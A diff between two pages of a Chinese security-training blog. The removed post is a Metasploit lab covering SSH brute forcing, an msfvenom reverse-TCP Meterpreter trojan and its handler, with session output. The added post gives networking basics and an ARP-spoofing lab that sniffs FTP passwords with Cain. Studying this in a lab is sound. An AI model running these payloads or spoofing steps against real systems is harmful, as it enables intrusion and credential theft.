@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="网络基础,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="MSF实验利用msf爆破ssh服务密码">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="网络（三）1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。  数据帧：在数据外边加入二层头部（帧头和帧尾）          Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾）  数据包：三层IP头部+数据 2.IP头部：标准长度是20Byte。  TTL：time to  live 生存时间，是一个三层防环机制，可以限制">
+<meta name="keywords" content="网络基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF实验">
-<meta property="og:url" content="blog.shenzihao.top/2019/08/10/MSF实验/index.html">
+<meta property="og:title" content="网络三">
+<meta property="og:url" content="blog.shenzihao.top/2019/08/24/网络三/index.html">
 <meta property="og:site_name" content="changyouB-log">
-<meta property="og:description" content="MSF实验利用msf爆破ssh服务密码">
+<meta property="og:description" content="网络（三）1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。  数据帧：在数据外边加入二层头部（帧头和帧尾）          Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾）  数据包：三层IP头部+数据 2.IP头部：标准长度是20Byte。  TTL：time to  live 生存时间，是一个三层防环机制，可以限制">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-11T05:59:23.487Z">
+<meta property="og:updated_time" content="2019-08-24T07:05:20.712Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MSF实验">
-<meta name="twitter:description" content="MSF实验利用msf爆破ssh服务密码">
+<meta name="twitter:title" content="网络三">
+<meta name="twitter:description" content="网络（三）1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。  数据帧：在数据外边加入二层头部（帧头和帧尾）          Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾）  数据包：三层IP头部+数据 2.IP头部：标准长度是20Byte。  TTL：time to  live 生存时间，是一个三层防环机制，可以限制">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="blog.shenzihao.top/2019/08/10/MSF实验/">
+  <link rel="canonical" href="blog.shenzihao.top/2019/08/24/网络三/">
 
 
 
 
 
-  <title>MSF实验 | changyouB-log</title>
+  <title>网络三 | changyouB-log</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/10/MSF实验/">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/24/网络三/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="申子昊">
@@ -262,12 +262,12 @@
     </span>
 
      <span title="Words count in article">
-     1.9k 字
+     1k 字
      </span>
 
         ...
      <span title="Reading time">
-     7 分钟
+     3 分钟
      </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSF实验</h1>
+          <h1 class="post-title" itemprop="name headline">网络三</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-10T11:39:25+08:00">
-                2019-08-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-24T10:38:17+08:00">
+                2019-08-24
               </time>
             
 
@@ -328,7 +328,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.9k
+                  1k
                 </span>
               
 
@@ -344,7 +344,7 @@
                   <span class="post-meta-item-text">Reading time </span>
                 
                 <span title="Reading time">
-                  7
+                  3
                 </span>
               
             </div>
@@ -365,63 +365,25 @@
       
 
       
-        <h1 id="MSF实验"><a href="#MSF实验" class="headerlink" title="MSF实验"></a>MSF实验</h1><h2 id="利用msf爆破ssh服务密码"><a href="#利用msf爆破ssh服务密码" class="headerlink" title="利用msf爆破ssh服务密码"></a>利用msf爆破ssh服务密码</h2><a id="more"></a>
+        <h1 id="网络（三）"><a href="#网络（三）" class="headerlink" title="网络（三）"></a>网络（三）</h1><p><strong>1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。</strong><br>  <strong>数据帧：在数据外边加入二层头部（帧头和帧尾）</strong><br>          <strong>Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾）</strong><br>  <strong>数据包：三层IP头部+数据</strong></p>
+<p><strong>2.IP头部：标准长度是20Byte。</strong><br>  <strong>TTL：time to  live 生存时间，是一个三层防环机制，可以限制一个数据包在网络中传输的时间。</strong><br>       <strong>数据包每经过一个三层设备（路由器），他的TTL值就会减1，如果TTL=0，那么这个数据包就不能继续传输，会被丢弃。</strong><br>       <strong>每经过一个三层设备，叫做1跳。</strong><br>  Protocol：用来标识上层协议，如果是UDP=17；TCP=6；ICMP=1.<br>  Source IP<br>  Destination IP </p>
+<p><strong>3.ARP：Address Resolution  Protocol地址解析协议，用来根据Ip地址解析mac。</strong><br>  <strong>ARP报文分为2类：ARP请求报文Request；ARP响应报文Reply。</strong><br>  ARP请求报文是以广播的形式发送；ARP响应报文是以单播的形式回复。<br>  <strong>arp  -a    //查看arp缓存信息</strong><br>  <strong>arp  -d    //清除ARP缓存</strong></p>
+<a id="more"></a>
 
-<p>一、    实验目的</p>
-<ol>
-<li>了解SSH的概念</li>
-<li>理解MSF爆破SSH的工作原理</li>
-<li>掌握MSF爆破SSH服务密码的方法<br>二、    实验要求</li>
-<li>根据实验指导书，完成msf爆破ssh服务密码的实验操作。</li>
-<li>编制msf爆破ssh服务密码的实验报告，验证实验过程。<br>三、    实验原理<br>SSH是一种网络协议，用于计算机之间的加密登录。<br>如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。<br>最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。<br>需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。<br>通过kali中的msf对我们具有ssh服务的服务器进行账号密码的爆破，从而让我们可以远程登录这台具有ssh服务的服务器</li>
-</ol>
-<p>四、    实验环境<br>Kali linux, centos<br>用户名：root<br>密码：sahoo@123<br>五、    实验操作<br>步骤一：    先打开msf</p>
-<p>步骤二：<br>作为我们的攻击机，我们利用msf这款工具来对ssh协议服务的账号密码进行爆破，输入msfconsole命令以开启msf这款工具</p>
-<p>步骤三：    然后我们用search ssh命令来查找相应的对ssh服务的一些攻击模块，其中划红箭头的是我们所需要的利用模块</p>
-<p>步骤四：    然后我们直接use这个模块，对这个模块的相关参数进行设置</p>
-<p>步骤五：    然后我们show options查看相应的参数设置，其中划红线的就是我们所需要设置的一些模块，RHOSTS是目标主机的ip，RPORT是目标主机开放ssh服务的相应端口，PASS_FILE是我们所需要的爆破密码的字典，USER_FILE使我们所需要的爆破用户名的字典，THREADS是我们爆破的线程，也可以理解为速度的快慢</p>
-<p>设置我们的目标主机的ip是192.168.78.129</p>
-<p>设置我们的目标主机开放ssh服务的端口 </p>
-<p>设置我们的线程为最大值5，这也是msf默认允许的最大的线程值</p>
-<p>步骤六：    字典的话我们可以自己用kali自带的crunch工具来生成，生成一个名为a.txt文件中，那么a.txt文件就是一个我们的字典，但是由于线程数非常的小，而且我们这次主要是以实验为主要目的，于是我们可以用网上一些较小的字典，来节省爆破的时间<br> 设置我们的密码的字典为桌面的pass.txt</p>
-<p>设置我们的用户名的字典为桌面的user.txt</p>
-<p>步骤七：    然后我们再次show options查看相应的设置是否完成</p>
-<p>步骤八：    设置完成后我们就直接exploit进行爆破，然后等待结果即可</p>
-<p>步骤九：    当爆破成功一个后，就会如此提示我们，并且提示我们已经成功的与目标主机建立了一个会话</p>
-<p>步骤十：    然后我们输入sessions 来查看这次会话的信息</p>
-<p>步骤十一：    然后我们用爆破出来的密码来进行ssh登录目标主机，可以看到我们进入了root用户的终端shell界面，当然我们也可以在我们刚才的msf中输入sessions -i 1来进入meterpreter界面从而输入shell来进入同样的终端界面，这两种方式都是可以的</p>
-<p>六、    实验结论<br>请按要求完成实验报告，并按时提交给老师。<br>实验效果验证</p>
-<p>七、    课后拓展<br>1.两种shell登录方式都试一下</p>
-<p>八、    先序课程</p>
-<ol>
-<li><p>《密码攻击-字典的生成》</p>
+<p><strong>4.ICMP：（Internet Control Message Protocol）互联网控制报文协议，是一个“错误侦测与回馈机制”，用来测试网络连通性。</strong><br>  <strong>ICMP报文类型分为2种：Request请求报文和Reply回复报文。</strong><br>  <strong>ping是一个工具/命令，利用的是ICMP协议。</strong></p>
+<p>  <strong>ping的常用参数：</strong><br>  ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> -t             //长ping，只能按Ctrl+C停止<br>  ping -a 192.168.120.250            //-a解析主机名<br>  ping -l 1000 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>        //-l指定测试数据包的大小；指定为1000个字节<br>  ping -n 6 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>            //-n指定发送数据包的个数为6<br>  ping -i 5 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>            //-i指定TTL值（每经过一个路由器减1，如果TTL=0就不能再继续传输）<br>  ping -l 1501 -f <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>        //指定发送的数据包为1501，-f表示不允许分片ARP欺骗:交换机的工作原理是广播，对用户的身份没有验证功能</p>
 <hr>
-<h2 id="metasploit之后门的生成"><a href="#metasploit之后门的生成" class="headerlink" title="metasploit之后门的生成"></a>metasploit之后门的生成</h2><p>后门简介<br>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。<br>metasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
-<p>KALI ip 192.168.10.128<br>WIN7 ip 10.0.2.2 </p>
-<p>选择以下攻击载荷并生成一个exe的木马程序</p>
-<p>命令msfconsole 开启Metasploit</p>
-<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷<br>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe<br>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-</li>
-</ol>
-<p>   使用命令 cd /，可以看到我们生成的exe文件</p>
+<p><strong>ARP欺骗：欺骗所有主机（告诉所有客户端假的网关mac地址）；中间人攻击（欺骗两个通信主机，获取他们的通信数据）</strong><br>  <strong>（1）实验说明：</strong><br>       3台虚拟机，连接到VMNET1,<br>       windows7(客户端)——&gt;攻击者——&gt;server  2008<br>       192.168.1.1           192.168.1.2   192.168.1.3<br>       修改各个主机的Ip地址，并且测试是否能通信。（注意防火墙的问题）<br>  <strong>（2）在攻击者的主机上安装Cain软件</strong><br>       Cain——————&gt;Sniffer————&gt;开始嗅探————&gt;右键————&gt;Scan  mac  address<br>       下边ARP——————&gt;加号——————&gt;找左边是欺骗对象，右边是欺骗的条目——————&gt;左上角低三个黄色图标，开始ARp欺骗。<br>  （<strong>3）在Server 2008 上安装FTP并配置</strong><br>       第一步：添加角色——————&gt;WEB服务——————&gt;FTP服务<br>       第二步：创建目录ftproot，目录下创建两个文件夹<br>                    down<br>                    up<br>       第三步：创建对应的用户，mengzhu和tianxiao<br>       第四步：编辑文件夹的权限，并设置mengzhu给予下载权限；tiaoxiao给予上传的权限。<br>       第五步：在IIS里创建FTP站点即可。</p>
+<pre><code>补充FTP的隔离用户目录结构：
+  ftproot(FTP的主目录，可以自定义)
+       ————localuser（不能修改）
+               ————mengzhu（文件夹和用户一定要同名）
+               ————tiaoxiao（只有tianxiao有权限查看和管理）
+               ————public（匿名用户，可以访问的目录）
+   创建FTP的时候，指定根目录为ftproot，修改ftp用户隔离为（用户名目录勾选，应用）</code></pre><p>  <strong>（4）在Windows 7 （客户端）进行访问并测试</strong><br>       在攻击者的主机上，查看是否有passwords（左下角第4个），如果有密码就证明获取密码成功。</p>
 <hr>
-<p>   接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
+<p><strong>6.Telnet：远程登录管理方式，使用的端口号是TCP-23。</strong><br>  （1）在2008里添加“功能”—–》telnet服务端和客户端<br>  （2）使用services.msc  打开服务，开启telnet<br>  （3）在Windows7上使用命令行来登录telnet<br>       telnet  192.168.1.3<br>       d:    //切换到d盘<br>       echo  123456  &gt; telnet.txt   //在被控制主机上创建一个文件<br>       type  telnet.txt                //查看telnet文件内容   </p>
 <hr>
-<p>   为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。<br>   在kali linux上打开ssh服务的方法：<br>   apt-get install openssh-server#安装<br>   一、配置SSH参数<br>   修改sshd_config文件，命令为：<br>   vi /etc/ssh/sshd_config<br>   将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes<br>   右击桌面，单击打开终端，输入命令<br>   将PermitRootLogin without-password修改为<br>   PermitRootLogin yes<br>   二、启动SSH服务<br>   命令为：<br>   /etc/init.d/ssh start<br>   或者<br>   service ssh start<br>   查看SSH服务状态是否正常运行，命令为<br>   /etc/init.d/ssh status<br>   或者service ssh status<br>   那么需要生成两个密钥：<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
-<p>   执行命令后都会让输入密码，直接敲回车设置为空即可</p>
-<p>   Win7关闭防火墙的方法</p>
-<hr>
-<p>   接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<hr>
-<hr>
-<p>   在msf中设置监听<br>   use exploit/multi/handler </p>
-<p>   show options </p>
-<p>   设置我们后门生成时的攻击载荷<br>   set payload windows/meterpreter/reverse_tcp<br>   show options<br>   set payload windows/meterpreter/reverse_tcp</p>
-<p>   payload =&gt; windows/meterpreter/reverse_tcp</p>
-<p>   设置参数（与后门的参数相对应）<br>   msf exploit(multi/handler) &gt; set LHOST 192.168.10.128<br>   LHOST =&gt; 192.168.10.128<br>   msf exploit(multi/handler) &gt; set LPORT 4444<br>   LPORT =&gt; 4444</p>
-<p>   msf exploit(multi/handler) &gt; run</p>
-<p>   在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程<br>   序时，会弹回一个shell<br>   [<em>] Started reverse TCP handler on 192.168.10.128:4444<br>   [</em>] Sending stage (179779 bytes) to 192.168.10.1<br>   [<em>] Sleeping before handling stage…<br>   [</em>] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<p>   实验结束</p>
 
       
     </div>
@@ -439,7 +401,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+            <a href="/tags/网络基础/" rel="tag"># 网络基础</a>
           
         </div>
       
@@ -452,8 +414,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/10/权限维持实验/" rel="next" title="权限维持实验">
-                <i class="fa fa-chevron-left"></i> 权限维持实验
+              <a href="/2019/08/24/网络二/" rel="next" title="网络二">
+                <i class="fa fa-chevron-left"></i> 网络二
               </a>
             
           </div>
@@ -462,8 +424,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/10/xss实战/" rel="prev" title="xss实战">
-                xss实战 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/24/网络四/" rel="prev" title="网络四">
+                网络四 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -617,7 +579,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF实验"><span class="nav-number">1.</span> <span class="nav-text">MSF实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用msf爆破ssh服务密码"><span class="nav-number">1.1.</span> <span class="nav-text">利用msf爆破ssh服务密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之后门的生成"><span class="nav-number">1.2.</span> <span class="nav-text">metasploit之后门的生成</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网络（三）"><span class="nav-number">1.</span> <span class="nav-text">网络（三）</span></a></li></ol></div>
             
 
           </div>
